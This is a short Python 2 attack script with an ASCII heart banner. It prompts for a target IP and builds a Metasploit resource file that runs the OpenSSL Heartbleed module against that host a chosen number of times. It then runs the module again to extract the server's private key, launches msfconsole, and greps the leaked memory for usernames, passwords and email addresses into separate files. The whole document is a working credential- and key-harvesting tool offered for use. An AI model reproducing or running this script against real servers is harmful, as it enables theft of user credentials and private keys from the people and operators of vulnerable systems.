
print '\033[1;38m     @@@@@@@@@@@       @@@@@@@@@@ \033[1;m'
print '\033[1;38m    @@@@@@@@@@@@@     @@@@@@@@@@@@ \033[1;m'
print '\033[1;38m   @@@@@@@@@@@@@@@   @@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m  @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m      @@@@@@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m        @@@@@@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m          @@@@@@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m            @@@@@@@@@@@@@@@ \033[1;m'
print '\033[1;38m              @@@@@@@@@@@ \033[1;m'
print '\033[1;38m                @@@@@@@ \033[1;m'
print '\033[1;38m                  @@@ \033[1;m'
print '\033[1;38m                   @ \033[1;m'
                                                                                                           
import subprocess
var = raw_input("Set Server IP: ")
print "Server's IP is:", var
attacks = int(input("Set number of attacks: "))
print "Attacks time:", attacks
file = open("heartbleed.rc", "w")
file.write("use auxiliary/scanner/ssl/openssl_heartbleed\n")
file.write("spool /root/Desktop/output.txt\n")
file.write("set RHOSTS " + var + "\n") 
file.write("set verbose true\n")
while attacks > 0:
	file.write("run\n")
	attacks = attacks - 1
file.write("use auxiliary/scanner/ssl/openssl_heartbleed\n")
file.write("spool /root/Desktop/priavatekey.txt\n")
file.write("set RHOSTS " + var + "\n") 
file.write("set verbose true\n")
file.write("set action KEYS\n")
file.write("run\n")
file.close()
subprocess.call(["msfconsole", "-r" ,"heartbleed.rc"])
import subprocess
u = open("usernames.txt", "w")
subprocess.call(["grep", "-oP" ,"username=\K(?:(?!&).)*", "output.txt"], stdout=u)
import subprocess
p = open("password.txt", "w")
subprocess.call(["grep", "-oP" ,"password=\K(?:(?!&).)*", "output.txt"], stdout=p)
import subprocess
e = open("email.txt", "w")
subprocess.call(["grep", "-oP" ,"email=\K(?:(?!&).)*", "output.txt"], stdout=e)

